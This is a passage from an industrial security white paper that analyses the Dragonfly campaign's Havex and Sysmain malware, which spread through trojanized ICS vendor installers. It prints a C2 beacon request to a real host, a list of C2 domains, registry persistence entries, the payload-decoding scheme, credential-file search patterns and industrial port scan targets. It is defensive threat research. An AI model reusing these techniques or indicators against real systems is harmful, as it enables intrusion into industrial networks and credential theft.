their\n\n\nlegitimate software replaced with versions\ncontaining the Dragonfly malware:\n\n- Industrial camera manufacturer Mesa\n\nImaging was the first to have their site\ncompromised in June 2013. It did not\nidentify and replace the software for six\nweeks.\n\n- The next site belonged to eWON – a\n\nproducer of industrial security appliances\nand remote access portal software.\nTheir site was compromised for ten\ndays beginning in January 2014 when\napproximately 250 copies of the malicious\nsoftware were downloaded[4].\n\n- The final site belonged to MB Connect\n\nLine who also produces a line of hardware\nand software security appliances similar\nto eWON. This site was estimated to have\nhosted the malicious software for a period\nof two weeks beginning in April 2014. No\ninformation has been disclosed regarding\nthe number of downloads from the Mesa\nImaging and MB Connect Line sites.\n\nThe contents analyzed reveal that the eWON\ninstaller included Havex v038 and the MB\nConnect Line Havex v043 (see Table 5 for\nadditional details).\n\nThe Mesa Imaging installers used a different\nTrojan known as Sysmain. Kaspersky data\nstates that 286 victims[7] received v038 and\n388 victims v043. Correlating the 250 copies\nof the malicious eWON downloads[4], it is likely\nthat the majority of v038 victims received the\nmalware via the eWON vector. This same logic\napplied to Havex v043 could imply that an\nestimated 350 victims[7] received malware via\nthe MB Connect Line vector.\n\nThe details of what was packaged in each of\nthese downloads will be discussed shortly.\n\n|Industry|Number of Sites|\n|---|---|\n\n\n#### Energy 10\n\n Energy Control Systems 6\n\n File Hosting Service 3\n\n Unidentified 1\n\n**Table 2: Sites Compromised During Watering Hole Attack Phase as per Symantec. Our research shows that**\nthe “Energy Control Systems” description is inaccurate.\n\n\n-----\n\n## Be Certain with Belden\n\n**Malware Details**\n\nThe overall Dragonfly campaign consisted\nof an arsenal of cyber weapons that were\ndeployed across a variety of targets. This paper\ndiscusses only a few of the components, and\nin particular, those that were directly observed\nin the context of the available malware\nsamples and their impact to ICS. Complete\ndetails on all of the malware components can\nbe found in the Kaspersky report “Energetic\n_Bear: more like a Crouching Yeti”_ [7].\n\n**Havex**\n\nThe first component used in the Dragonfly\ncampaign was the Havex remote access tool\n(RAT) also referred to as Backdoor.Oldrea and\nthe Energetic Bear RAT. The main purpose of\nthis module is to establish persistance on the\ntarget, and then communicate with the C2\nservers to download and execute additional\nmodules.\n\n### Havex is the most widely used component in the Dragonfly campaign, infecting an estimated 2,470 victims using as many as 50 different variations[7]. Table 3 provides\nadditional Havex infection details. Note\nthat Havex revision numbers are stated in\nhexadecimal format.\n\nThe mechanism by which the RAT was loaded\nand utilized is as follows. First, an initial event\nwas triggered by the victim; either by opening\na malicious document, visiting a compromised\nwebsite or installing trojanized software.\n\nNext, the RAT software was loaded onto the\nvictim’s computer. Once installed, the malware\ninitiated a request to a C2 server via HTTP\nusing port 80/tcp. The outbound message\nconsisted of a GET (in older versions) or a\n```\nPOST request to a PHP script on the target\n\n```\nC2 server. This message also included an initial\nset of victim parameters:\n\n- Victim identification\n\n- Havex version number\n\n- Operating system version (in decimal\n\nformat)\n\n- Method of infection\n\n|Havex Revision|Number of Infections|Percentage of Total|\n|---|---|---|\n\n\nOnce an active C2 connection was established,\nas verified by the response from the GET/\n```\nPOST request, various modules were embedded\n\n```\nin the reply message from the C2 servers.\nThese were located between unique Havex\ncomment tags <!--havex (encrypted\n```\ncode) havex-->. An example of a typical\nPOST request and the corresponding response\n\n```\n(obscured) has been provided below.\n\nNotice in the POST request the victim\nidentifier (id), Havex version number (v1), OS\nversion (v2), and installer (q).\n\nPOST Request from Victim to C2 Server:\n```\nhttp://rapidecharge.gigfa.com\n\n/blogs/wp-content/plugins\n\n/buddypress/bp-settings/bpsettings-src.php?id=185545342\n\n88436177420090FD80-c8a7af419\n\n640516616c342b13efab&v1=043&v2=\n170393861&q=45474bca5c3a10c8e94\ne56543c2bd\n\n```\nResponse from C2 Server to Victim with\nSoftware Module:\n```\n<html><head><mega httpequiv=’CACHE-CONTROL’\ncontent=’NO-CACHE’></\nhead><body>No data!<!-havexQlpoOTFBWS<additional\ndata removed>lIwg==havex--></\nbody></head>\n\n```\nSpecific details relating to the Havex RAT in\nterms of files installed, modules downloaded\nand data collection will be discussed further\nunder each of the unique trojanized software\ncomponents.\n\n\n#### x024 1031 41.7%\n\n x043 388 15.7%\n\n x038 286 11.6%\n\n x01F 212 8.6%\n\n x020 122 4.9%\n\n Others 431 17.5%\n\n**Table 3: Havex Infection Distribution[7]**\n\n\n**Sysmain**\n\nThe Sysmain component was not mentioned\nin the Symantec report, but was analyzed\nby Kaspersky[7]. This malware is another\nform of RAT that once persistance has been\nestablished, provides various functions to\ncontrol, interact and extract information from\nthe victim.\n\nFour static C2 server addresses are hard-coded\ninto the malware; with each variant having\nits own set of servers. None of the C2 servers\nanalyzed in this paper are active at this time.\n\nEleven commands have been found within the\nSysmain RAT that provide the capability to:\n\n- Execute shell commands\n\n- Launch additional executables and libraries\n\nthat may have been sent by the attacker’s\nC2 server\n\n- Examine the victim’s file system\n\n- Collect arbitrary files from the victim’s\n\ncomputer\n\nSysmain also possesses the ability to\nchange the hard-coded public key used\nfor asymmetric encryption during C2\ncommunications and remove traces of its\npresence from the Windows Registry once\ncompleted.\n\nLimited information is available as to how\nextensively the Sysmain RAT was used in the\noverall campaign. The only malware analyzed\nin this paper that used Sysmain was found in\nthe trojanized Mesa Imaging driver software,\nsignifying that this component was probably\nonly used early in the Dragonfly campaign.\n\n\n-----\n\n**Karagany**\n\nKaragany is a backdoor that has been used in\nthe past for cyber reconnaissance activities.\nThis tactic was first mentioned in September\n2013 in the Cisco Blog “Watering-Hole Attacks\n_Target Energy Sector”_ [15].\n\nLike the already mentioned modules,\nKaragany possesses similar capabilities\nfor file upload, download and execution;\nmaintenance functions for updating itself;\nand the ability to cleanly remove itself from\nthe target. It also possesses a small, embedded\nDLL file that monitors WSASend and send\nAPIs in order to extract basic authentication\ncredentials sent over unencrypted HTTP\nsessions.\n\nOne of the Karagany modules provided the\nability to take screenshots on the target and\nupload them to a C2 server. Another module\nworth mentioning was used to list files that\ncontain specific names or extensions, and\nupload those files to a C2 server. Some of the\ninteresting strings that are included in the\nsearch module are provided in Table 4.\n\nThe Karagany RAT was not observed in any\nof the malware analyzed for this paper, and\nhas only been observed in 3-5 percent[4,7] of\nthe total infections during the Dragonfly\ncampaign.\n\n**Trojanized Software Content**\n\nThis portion of the paper provides a detailed\nanalysis of four of the five malware samples\nobtained from the three ICS-related websites\nthat were compromised. It is important to\nremember that the results discussed here are\nfrom specific malware samples that contain\nonly a small number of the total variants\nused in the overall Dragonfly campaign.\n\n|Search Criteria|Likely Use|\n|---|---|\n\n\n#### *pass*.* Local password file\n *secret*.* Local password file\n *.pgp PGP Public and Private Keys\n *.pst Outlook Message Box\n *.p12 Private Keys and Certificates\n *.tc TrueCrypt Volume\n\n**Table 4: Karagany File Search Criteria**\n\n\nTable 5 provides details of the software\nthat was trojanized on each of the supplier\nwebsites and analyzed in this paper.\n\nThe analysis of the samples was performed on\nan isolated network with firewall-protected\nInternet access (necessary to establish C2\ncommunications). Only HTTP (80/tcp), HTTPS\n(443/tcp) and DNS (53/tcp) traffic was\nallowed through the firewall.\n\nThe number of devices on the test network\nvaried, but always included at least two\nWindows hosts that were installed with\nvarious OPC client and server components.\nThe components used a shared local\nWindows account mechanism for the DCOM\nauthentication.\n\nMultiple PLCs were also added to the\nnetwork to offer interesting targets to the\nmalware. These utilize common industrial\nprotocols, such as Modbus/TCP, EtherNet/\nIP, and Siemens S7-Comms, as well as their\nassociated engineering toolkits (e.g., RSLinx,\nStep 7, etc.).\n\nThe infection tests were allowed to execute\nfor periods that exceeded 24 hours to\ndetermine if there were any payloads that\nmight enter the system only after the system\n\n\nhad been infected for a period of time. One\ntest was run for a period of seven days to\nfurther study any latent modules that may\ninstall well after the initial infection.\n\nAll test runs yielded similar results with no\nadditional content downloaded after the OPC\nscanner module in Stage 3. This information\nconflicts with the Kaspersky report[7] that\nintroduces a fourth module that would\nscan for the presence of common industrial\nprotocols. This variant was not available\nthrough VirusTotal and could not be verified.\n\n**Trojanized Mesa Imaging Software**\n\nThe Mesa Imaging software that was\ntrojanized consisted of a set of drivers\n(libMesaSR version 1.0.14.706) used to\ninterface their cameras with appropriate\nimaging software. Mesa Imaging provides\nboth 32-bit and 64-bit versions of their\ndrivers for the Windows and Linux operating\nsystems. These drivers can be downloaded\ndirectly from their HTTP website with no\nregistration or authentication.\n\nDragonfly attempted to compromise the\nWindows 32-bit version only. This indicates\nthe intended targets were Windows XP host\ncomputers that were likely unpatched (in\n\n#### Malicious Content\n\n Havex RAT – Version 38\n Havex RAT – Version 38\n\n|Company Name|Product Name|Trojanized Software|Malicious Content|\n|---|---|---|---|\n\n\n#### eWON\n (part of ACT’L Group)\n\n\n#### Talk2M egrabitsetup.exe\n\n```\n          ecatchersetup.exe\n\n```\n\n#### MB Connect Line mbCONNECT24\n mbNET\n\n```\nmbcheck.exe\n\nsetup_1.0.1.exe (mbconftoolzip)\n\n```\n\n#### Havex RAT – Version 44\n Havex RAT – Version 44\n\n\n#### Mesa Imaging SR4000/4500 SwissrangerSetup1.0.14.706.exe Sysmain RAT\n\n**Table 5: Details of Trojanized Software**\n\n\n-----\n\n## Be Certain with Belden\n\nterms of both the Windows OS and thirdparty applications) facilitating future phases\nof the attack.\n\nIn order to be installed successfully, all Mesa\nImaging drivers require that a Windows\naccount with administrative privileges be\nused. Amazingly, the malicious components\nwere able to successfully install and execute\nregardless of account controls even when\nthe legitimate software failed to install. This\nrepresents a significant ability of the malware\nto perform unauthorized code execution. It\ncould be used in future attacks to exploit\naccounts, regardless of the user’s privileges.\n\nUnfortunately, this particular variant was\nbased on the Sysmain RAT and did not\nattempt to initiate any C2 communications\n– in fact, no output network traffic was\nobserved – so limited information is available\non this particular trojanized software. This\ncould indicate the presence of a “kill date”\nin the malware, disabling its execution after\nthat date, something seen previously in ICS\nmalware, such as Stuxnet.\n\nOnce the user launched the infected Mesa\nImaging software setup application, the\nmalware copied itself, along with the Sysmain\nloader module, into the %TEMP% directory\nof the current user. The original installer was\ncopied as setup.exe while the Sysmain\nmodule was copied as tmp687.dll with\nthe “hidden” attribute set.\n\nIn order to establish persistance on future\nsystem reboots, the malware copied the\nSysmain module to the %APPDATA%\ndirectory of the local user, and created an\nentry in the Windows Registry to run the\ncommand upon startup.\n```\nHKCU\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Run\n\n load (REG_SZ):\n\n %SYSTEM32%\\rundll32.\nexe “%APPDATA%\\sydmain.\ndll”,AGTwLoad\n\n```\n\nFile details are provided below:\n\nFilename: `SwissrangerSetup1.0.14.706.exe`\n\nMD5: `e027d4395d9ac9cc980d6a91122d2d83`\n\nSHA-1: `b3e3d9d8779c51f637401f5dee4fcf016acc8038`\n\nSHA-256: `398a69b8be2ea2b4a6ed23a55459e0469f657e6c7703871f63da63fb04cefe90`\n\nInitial Droppers: `%TEMP%\\tmp687.dll`\n\nAdditional Files: `%TEMP%\\setup.exe`\n\nPersistent Files: `%APPDATA%\\sydmain.dll` Admin Privileges\n\n`%APPDATA%\\sydmain.dll` User Privileges\n\nThe drivers available from Mesa Imaging at the time this paper was published were version\n1.0.14.747.\n\n**Trojanized eWON Software**\n\nThe eWON software was the first compromised ICS-related website to contain the Havex RAT\nmodule. Two different software applications were targeted, but unfortunately only one was\navailable for this analysis.\n\nThe first component is the eWON application for Internet-based, on-demand remote access\n(eCatcher version 4.0.0) based on their Talk2M solution. The second application is the VPN client\n(eGrabit version 3.0 Build 82) used with their eFive continuous remote access solution.\n\nBoth compromised software components can be downloaded directly from their HTTP website\nwith no registration or authentication.\n\nThe eGrabit application does require an account with administrative privileges in order to\ninstall successfully. Similar to the Mesa Imaging application, the malicious content was able to\nsuccessfully install and execute even though the legitimate applications could not be installed\nusing a restricted account.\n\nLike the Mesa Imaging tests, the malware did not attempt to initiate any C2 communications\nonce it was installed. In fact, no output network traffic was observed, so limited information is\navailable on this particular malware package. It is highly likely that this malware had a hardcoded kill date, which restricted its period of use. This could indicate that the attacker was still in\nthe “development” phase of their campaign regarding the final ICS targets.\n\nOnce the user launched the setup application, the malware copied itself along with the Havex\nloader module in the %TEMP% directory of the current user. The original installer was copied as\n```\negrabitsetup.exe while the Havex module was copied as TmProvider.dll with the\n\n```\n“hidden” attribute set on both the EXE and DLL files. A small additional text file qln.dbx was\nalso created containing the Havex version number (38 in this case).\n\nIn order to establish persistance after system reboots, the malware copied the Havex module to\none of two directories, depending on the authorization level of the current user. For users with\nadministrative privileges, the file was placed in the %SYSTEM32% directory; otherwise the file\nwas installed in the %ALLUSERAPPDATA% directory. A corresponding entry was created in the\nWindows Registry to run the command upon startup.\n\n\n-----\n\nRestricted User\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n TmProvider (REG_SZ):\n\n rundll32 “%ALLUSERAPPDATA%\\TMPprovider038.dll”,RunDllEntry\n\n```\nAdministrative User\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n TmProvider (REG_SZ):\n\n rundll32 “%SYSTEM32%\\TMPprovider038.dll”,RunDllEntry\n\n```\nFile details have been provided below.\n\nFilename: `egrabitsetup.exe`\n\nMD5: `1080e27b83c37dfeaa0daaa619bdf478`\n\nSHA-1: `2abfa187fb4747c74584b3a0b395ebc81fd742dc`\n\nSHA-256: `0007ccdddb12491e14c64317f314c15e0628c666b619b10aed199eefcfe09705`\n\nInitial Droppers: `<username>\\%TEMP%\\TmProvider.dll`\n```\n          <username>\\%TEMP%\\qln.dbx\n\n```\nAdditional Files: `%TEMP%\\setup.exe`\n\nPersistent Files: `%SYSTEM32%\\TMPprovider038.dll` Admin Privileges\n\n`%ALLUSERSAPPDATA%\\TMPprovider038.dll` User Privileges\n\neWON released a security incident report via their website on January 30, 2014[16], advising all\ncustomers to upgrade to version 4.1 of the eCatcher software. This version’s features automatically\nerase any trace of the Havex malware.\n\neWON published an update to the original report on July 3, 2014[17]. There has been no similar\nnotification from the vendor regarding the status of the eGrabit application, however the current\nsoftware version is 3.1. Details in the eWON press release discussed new “password enforcement”\nfeatures and a focus on security enhancements[18]. Symantec and Kaspersky reports have not made\nany reference to the compromised eGrabit software.\n\n**Trojanized MB Connect Line Software**\n\nThe MB Connect Line software is the most recent software exploited in the Dragonfly campaign.\nLike the case with eWON, the attackers targeted two different components of the company’s\nproduct line.\n\nThe first compromised software (mbCHECK version 1.1.1.0) was used to validate and diagnose the\nsecure, encrypted connections to the cloud-based or hosted servers of the mbCONNECT24 remote\naccess solution.\n\nThe second package consisted of a configuration tool (mbCONFTOOL version 1.0.1.0) downloaded\nas part of a ZIP archive that contained the installation file (setup_1.0.1.exe) and a PDF document.\nThis package was used to configure initial network settings for the mbNET line of industrial\nsecurity appliances.\n\nThis product is similar to the Siemens Primary Setup Tool (PST), and typically is only used to\nestablish an initial connection with the security appliance via a local network. Subsequent detailed\nconfiguration of the mbNET appliance (serial interfaces, VPN settings, key installation, etc.) occurs\ndirectly on the device via a built-in local Web server using a standard Internet Web browser.\n\n\nBoth compromised software components\nrequire only a trivial web registration\nprocedure by a user in order to be\ndownloaded. Once the user was registered,\nan email was immediately sent providing the\ndownload links directly from the MB Connect\nHTTP site – no further authentication was\nrequired.\n\nThe mbCHECK diagnostic tool does not\nrequire special privileges to execute, and\ncan be run as a restricted Windows user. The\nmbCONFTOOL setup application does require\nan account with administrative privileges in\norder to install successfully.\n\nSimilar to the Mesa Imaging and eWON\napplications, the malicious content was able\nto successfully install and execute, even\nthough the mbCONFTOOL application could\nnot be installed using a restricted account.\nOnce the malware had been successfully\ninstalled, it established a C2 communication,\nreceived downloaded modules and executed\nthese modules regardless of the user account\nprivileges.\n\nAfter the user launched the setup application,\nthe malware copied itself along with the\nHavex loader module in the %TEMP%\ndirectory of the current user. The original\ninstaller was copied as mbCHECK.exe or\n```\nsetup_1.0.1.exe, while the Havex\n\n```\nmodule was copied as either mbCHECK.\n```\ndll or setup_1.0.1.dll (depending\n\n```\non the installation source) with the “hidden”\nattribute set on both the EXE and DLL files.\nA small additional text file qln.dbx was\ncreated containing the Havex version number\n(43 in this case).\n\nIn order to establish persistance after system\nreboots, the malware copied the Havex\nmodule to one of two directories, depending\non the authorization level of the current\nuser. For users with administrative privileges,\nthe file was placed in the %SYSTEM32%\ndirectory; otherwise the file was installed\nin the %ALLUSERAPPDATA% directory.\nA corresponding entry was created in the\nWindows Registry to run the command upon\nstartup.\n\n\n-----\n\n## Be Certain with Belden\n\nRestricted User\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n svcprocess (REG_SZ):\n\n rundll32 “%ALLUSERAPPDATA%\\svcprocess043.dll”,RunDllEntry\n\n```\nAdministrative User\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n svcprocess (REG_SZ):\n\n rundll32 “%SYSTEM32%\\svcprocess043.dll”,RunDllEntry\n\n```\nFile details are provided below:\n\n|Legitimate Software|C2 Site URL|\n|---|---|\n\n```\negrabitsetup.exe\necatchersetup.exe\n\n```\n\n#### www.pc-service-fm.de artem.sataev.com swissitaly.com (*)\n\n www.pc-service-fm.de artem.sataev.com swissitaly.com (*)\n\n\n#### sinfulcelebs.freesexycomics.com (*)\n```\nmbcheck.exe rapidecharge.gigfa.com\n\n sinfulcelebs.freesexycomics.com (*)\nsetup_1.0.1.exe rapidecharge.gigfa.com\n SwissrangerSetup1.0.14.706.exe None observed\n\n```\n**Table 6: C2 Sites Observed from Installation of Trojanized Software**\n\n\nMB Connect Line, at the time this paper was\npublished, offers mbCHECK version 1.1.2.\nThe mbCONFTOOL tool application is still at\nversion 1.0.1, however, when this analysis was\ndone the malicious content appeared to be\nhave been removed.\n\n**Malware Command-and-Control**\n\nC2 sites appear to be hard-coded into the\nspecific version of malware. In analyzing\ndozens of software installations using the\nsupplied malware samples, the site selection\nappeared to be random using a limited\nnumber of sites. The malware continued to\nattempt connections until a valid C2 site was\ndiscovered.\n\nSites that were observed have been listed in\nTable 6. Those URLs marked with an asterisk\n(*) appear to be no longer functioning as a\nC2 site. The inactive sites do not appear to\nhave been cleaned of the C2 infrastructure,\nas the PHP scripts are still responding with\nHavex content as illustrated below (note the\npresence of the comment tag containing the\nword Havex).\n```\n<html><head><mega httpequiv=’CACHE-CONTROL’\ncontent=’NO-CACHE’></\nhead><body>Sorry, no data\ncorresponding your request.<!-havexhavex--></body></html>\n\n```\nAdditional URLs can be found in the\nappendices to the Kaspersky report[7].\n\n**Payloads**\n\nThe most interesting aspect of the Dragonfly\nattack sequence was the ability of the\nmalware to receive updated software modules\nand instructions from its C2 servers. Most of\nthe C2 servers are no longer “managed” by the\nattackers, so the content has not varied much\nsince the end of the attack in June 2014.\n\nSeveral servers are still able to download\nmodules to infected computers, so these\ncould be evaluated. The relevant modules\nare detailed in Table 6 in the context of\ninstallation of the base RAT via one of the\ntrojanized applications already discussed.\n\n\n-----\n\nAs noted earlier, the process of infection\nis consistent. Once the user has launched\nthe setup application containing the initial\ndropper files, the malware copies files\ninto the relevant directories and makes\nappropriate entries in the Windows Registry.\nIt then begins a very scheduled process of\nattempting to establish communications with\nany of the hard-coded C2 URLs.\n\nThis communications process repeats on a\nfixed interval of 24 minutes. If a successful\ncommunication is not accomplished, the\nmalware remains dormant for a period of 24\nminutes, when it will try again using one of\nwhat appears to be three different C2 URLs.\nThe malware randomly chooses which to use,\nas it may use the same non-responsive URL\non successive attempts.\n\nFigure 4 shows the payloads extracted\nfrom an actual PCAP during an interactive\nsession between a host and the C2 servers.\nThe output illustrates how the malware\nconnects with multiple C2 servers to receive\nadditional payloads and instructions. The\nfirst connection attempt (ref packet 37)\naddressed a site that was non-responsive. The\nthree highlighted downloads occurred via\nresponsive URLs with the payload modules\nlisted.\n\n**Havex Persistance and Engineering Laptops**\n\nThe process of communicating with the C2\nservers does not appear to ever terminate.\nThis introduces a serious security problem\nregarding the use of computers in both\nsecure (i.e., no public network access) and\ninsecure (public network access available)\nenvironments. Should an ICS PC be used and\n\n**Figure 4: Havex Download Modules**\n\n\ninfected in a network with public access, the\nmalware will continue to be active when it is\nlater carried into a “secure” ICS environment.\n\nConsider a case where one of the infected\napplications is installed on an engineering\nlaptop that is both used to perform\nmaintenance on equipment on isolated\nindustrial networks, and is also used to\nperform standard business activities on\noffice networks. Since the malware installs\npermanently on the victim’s computers, it\nmay not initially establish communication\nwith the C2 servers when inside the secure\nnetwork.\n\nHowever, since the malware will continue to\nlaunch each time the computer is restarted,\nthere is a good chance that the computer\nwill be connected at some point to a network\nthat offers access to the C2 servers via a\npublic Internet connection. The ability of\nthe malware to create local data stores\nwhen execution occurs, and then transfer\nthese files to the C2 at a later time can\npotentially allow sensitive information (such\nas user authentication information, VPN\nconfiguration files, etc.) to be transferred to\nthe attackers.\n\n**Havex Module Transfer Process**\n\nEach of the Havex modules were included\nin responses received from a C2 server as a\nresult of HTTP POST requests generated by\nthe RAT. These responses contained encrypted\ndata placed in HTTP text between specially\nlabeled comment tags.\n\nThe malware then extracted this content and\nplaced it in a local file %TEMP%\\[seq_\n\n```\nno].xmd. This file was decoded (base64\n\n```\nencode), decompressed (bzip2 compression),\ndecrypted (XORed with “1312312”) and saved\nas a temporary PEDLL file %TEMP%\\[seq_\n```\nno].tmp.dll after which the original\n.xmd file was deleted. This DLL file was then\n\n```\nloaded into memory and executed.\n\nMost modules also will have encrypted\nthe data sent back to a C2 server. This was\naccomplished using a 1024-bit RSA public\nkey that was located in the module’s resource\nsection. The data generated by each module\nwas compressed, encrypted and written into\n```\n%TEMP%\\[seq_no].yls before being\n\n```\ntransferred to C2 servers. Each .yls file was\nencrypted with the 3DES algorithm using a\nrandom 192-bit key that was then encrypted\nusing the included RSA key.\n\nThe file naming does not appear to be\nrandom, but rather utilized a hexadecimal\nsequencing scheme. In most of the cases\nanalyzed, if the malware was executed with\nadministrative privileges, the numbering\nbegan between 6 and 9. The numbers started\nat “4A” when using restricted user accounts.\n\n**Stage 1 - Outlook Contacts Grabber Payload**\n\nThe first module downloaded following a\nsuccessful C2 connection was designed to\ndisclose contact information on the local\nhost. This was accomplished by copying the\ninformation contained in the outlook.\n```\nnk2 file used by Microsoft Office for\n\n```\nautocomplete features. The information was\nthen placed in a %TEMP%\\[seq_no].yls\nfile as described above and transferred to the\nC2 server. Details of this payload are provided\nin Table 6.\n\n\n-----\n\n## Be Certain with Belden\n\n**Figure 5: Output Generated from Havex Sysinfo Payload**\n\nFilename: `%TEMP%\\[seq_no].tmp.dll`\n\nFile Size: `261120`\n\nMD5: `7cff1403546eba915f1d7c023f12a0df`\n\nSHA-1: `24b77d6bbb0e3526d0e2f77d3d1a6829abc2f6b8`\n\nSHA-256: `0859cb511a12f285063ffa8cb2a5f9b0b3c6364f8192589a7247533fda7a878e`\n\n**Stage 2 - System Information Grabber Payload**\n\nThe next module downloaded was designed to collect basic information about the current system\nand its configuration. This extensive summary has been summarized in Figure 5. Information,\nsuch as username, local drives, default browser, running processes, and a list of files from the\nDesktop, My Documents, Program Files and root directories, is captured (not shown).\n\nThe information provided by the Symantec report stated that this phase of the attack also\ncollected “ICS-related configuration files”[4] and “VPN configuration files”[3]. This information can\nbe extrapolated to imply that the VPN configuration information from the eWON eCatcher\napplication was extracted.\n\nReview of the eWON incident advisory and the change log for the eCatcher application implies\nsimilar information stating that in the updated revision 4.1.0 of the application “encrypted user\npassword not anymore stored on the PC”[16]. Similar information available for the eGrabit revision\n3.1 build 85 states “passwords are now hidden/encrypted inside configuration page”[18], implying\nthat in the targeted 3.0 version of the eWON software, all passwords were stored in cleartext.\n\nDetails on this payload are provided below:\n\n\n**Stage 3 - OPC Scanner Payload**\n\nThe final payload observed with the samples\nprovided by VirusTotal was used to itemize all\nWindows hosts on the local area networks,\nand then query each for any OPC-related\nservices they might be running. This payload\nappears to use a combination of live network\nscans, as well as a review of Windows most\nrecently used (MRU) lists. The use of MRUs was\ndiscovered when the module listed nodes that\nwere previously on the network, but were not\npresent when the actual scan was executed.\n\nThe module was unable to identify nonWindows devices on the network. It was\nalso unable to identify devices that existed\non networks accessible only via the default\ngateway (i.e., via Layer 3 routing).\n\nAccording to Kaspersky[7], all OPC scanner\nmodules were compiled between April and\nMay 2014. This would indicate that the OPC\ncomponent was absent from the earlier ICSrelated compromises of Mesa Imaging and\neWON, and was targeted at those users of the\nMB Connect Line solutions.\n\nOn some systems where the malware was\ninstalled using an account with administrative\nprivileges, the local malware would continue\nto communicate with the C2 servers. Despite\nthe fact that no new information was\navailable for the servers, the malware would\nspawn the OPC scanner module repeatedly.\n\n\n-----\n\n**Figure 6: Output Generated from the Havex OPC Scanner Payload**\n\nThis happened several times per minute and resulted in various processes crashing on the target\ncomputers, including the Windows Explorer process. The behavior was not observed on hosts\nthat were infected with the malware via restricted user accounts (e.g., accounts with only nonadministrative privileges).\n\nAnother interesting feature of the OPC module was how it was able to discover OPC services on\nhosts that were not obvious targets based on the output of the initial OPC scan.\n\nFigure 6 shows the output generated each time the OPC scanner module executes. In this\nillustration, there are three hosts identified on the network, two of which contain multiple OPC\nserver instances. None of the PLCs connected to the network have been identified as “LAN hosts.”\n\nWhen evaluating the network traffic originating from the infected host using collected PCAP\nfiles, it was discovered that the scanner found installed OPC services on the ENGTOOLS host\nshown above. These components were verified as present and were installed as diagnostic client\ntools included with the PLC’s engineering toolkit.\n\nFigure 7 shows how the infected host repeatedly initiated a DCE Bind request on the\npotential target (ref packet 754809), and then attempted to create a new OPC instance via the\n```\nRemoteCreateInstance request. Each time, the host received an “access denied” response\n\n```\n(ref packet 754828), however, this process repeats indefinitely on a regular interval.\n\nFile details for the OPC payload have been provided below:\n\n\n**Stage 4 - Industrial Protocol Scanner**\n**Payload**\n\nKaspersky identified an additional payload\ndesigned to scan a network looking for hosts\nthat were listening for communications on\nTCP service ports commonly associated with\nindustrial protocols. According to Kaspersky[7],\nthis module was downloaded and executed\nlike other modules.\n\nOn execution, it decrypted a binary contained\nin the module’s resource section and\nsaved the file as %TEMP%\\[random].\n```\nexe. The executable file then performed\n\n```\na LAN scan logging the results to file\n```\n%TEMP%\\~tracedscn.yls.\n\n```\nThe ports extracted from the module include:\n\n- 102\n\n- 502\n\n- 11234\n\n- 12401\n\n- 44818\n\nTable 1 (Part A), offers guidance as to the\ncommon manufacturers and devices that\ncommunicate using these ports.\n\nSCADA applications, rather than devices,\nuse the last two ports. Measuresoft in their\nScadaPro Server previously used 11234/udp.\nIn September 2011, several vulnerabilities\nwere disclosed that exploited services on this\nport (reference ICS-CERT ICSA-11-263-01).\nMeasuresoft disabled this service in version\n4.0.1, and offered this update to all customers\nat no charge.\n\nThe Interactive Graphical SCADA System\n(IGSS) from 7-Technologies (now part of\nSchneider Electric) uses 12401/tcp for the\ndata collection services utilized by other\nSCADA clients, such as HMIs. At roughly\nthe same time as Measuresoft, several\nvulnerabilities were also disclosed for the\nIGSS SCADA server (some disclosed by this\nauthor[19]).\n\n\n-----\n\n## Be Certain with Belden\n\n**Figure 7: Attempted Connection to Potential OPC Target**\n\nBoth of these vulnerabilities have exploit code readily available in the Metasploit framework and through other open-source outlets. It could be\nspeculated that this port was only added to the module for testing purposes. However, both Measuresoft and 7-Technologies have customers in the\nindustries impacted by the Dragonfly campaign. Thus, it is possible that this is a deliberate search for systems that have exploitable vulnerabilities.\n\nThe remaining three industrial ports (102, 502, 44818) are used by very common ICS protocols, namely Siemens S7-Comms, Modbus/TCP and\nEtherNet/IP. Most leading PLC manufacturers support at least one of these protocols. Details of this module are provided below:\n\n\n-----\n\n### Conclusion – Part B\n\nThis detailed analysis of components leads to a number of insights regarding the tactics,\ntechniques and procedures of the Dragonfly campaign that are important to those responsible\nfor industrial cyber security.\n\n- **Offense in Depth** was an important strategy for the Dragonfly campaign. Multiple levels\n\nof organizations, as well as supply-chain vendors, were targeted. In addition, the C2\ninfrastructure allowed the perpetrators to enhance and expand the payloads throughout the\nlife of the attacks. Effective protection would have required a corresponding Defense in Depth\napproach.\n\n- Industrial sectors beyond energy are now the subjects of advanced, persistent threats. As\n\ndiscussed in Part A, the pharmaceutical industry was the target of the Dragonfly campaign.\n\n- The Dragonfly campaign showed how trusted supply-chain vendors can be used to deliver\n\nmalicious payloads directly to difficult to reach endpoints, such as ICS equipment. This means\nthat risk assessments should now consider supply-chain entry points to control networks as\npotential threat sources.\n\n- The intended targets were ICS computers running Windows XP. Even though software for\n\nother operating systems was available, Dragonfly only attempted to compromise Windows 32bit legacy versions.\n\n- Non-administrative accounts can be a path to the industrial network as shown by Dragonfly’s\n\nsuccess with such accounts. Thus, even computers that have been “hardened” with secure local\npolicies can be infection vectors.\n\n- Laptops or other mobile devices that move from secured and isolated ICS networks to less\n\nsecure office networks can also be an entry point for malware, as was shown by Dragonfly’s\nability to gain permanent installation on engineering laptops.\n\n- Monitoring unauthorized HTTP traffic coming out of an ICS network should be part of Defense\n\nin Depth. It would have been an effective defense against this malware.\n\n### Belden’s Cyber Security Expert, Eric Byres\n\nEric Byres, CTO of Tofino Security, a Belden Brand, and a world authority on industrial cyber\nsecurity commented:\n\n“The combination of Dragonfly’s ‘Offense in Depth’ strategy and the fact that it circumvented\ntraditional desktop security controls highlights the urgent need for matching Defense in Depth\nsecurity on the plant floor. Not only do we need to defend the ICS devices, but industry also\nneeds to consider better defenses for the ICS network.\n\nFor example, monitoring unauthorized HTTP traffic coming out of an ICS system would\nhave been a very effective defense against this malware. Most ICS systems should not be\ncommunicating to web servers on the Internet, especially ones with URLs like ‘sinfulcelebs.\nfreesexycomics.com.’\n\nThe fact that the Dragonfly campaign ran for almost a year without detection shows that the\nmonitoring and control of ICS traffic (especially outbound traffic) is still unacceptably poor in\nmany industries.”\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n||Defending Against the Dragonfly Cyber Security Attacks Part C – Assessing the Consequences Joel T. Langill ICS Cyber Security 